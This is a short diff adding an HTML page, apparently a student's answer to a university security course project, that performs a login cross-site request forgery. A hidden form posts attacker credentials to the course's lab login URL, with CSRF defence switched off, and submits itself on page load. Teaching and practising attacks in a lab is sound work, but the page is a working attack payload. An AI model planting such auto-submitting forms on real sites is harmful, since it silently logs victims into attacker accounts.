@@ -1,0 +1,9 @@
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+
+<iframe style="display:none" name = "blank_frame"></iframe> 
+<form target="blank_frame" name = "csrf" action="https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4" method="POST">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="l33th4x" />	
+</form>
+
+<script> window.onload = document.csrf.submit(); </script>
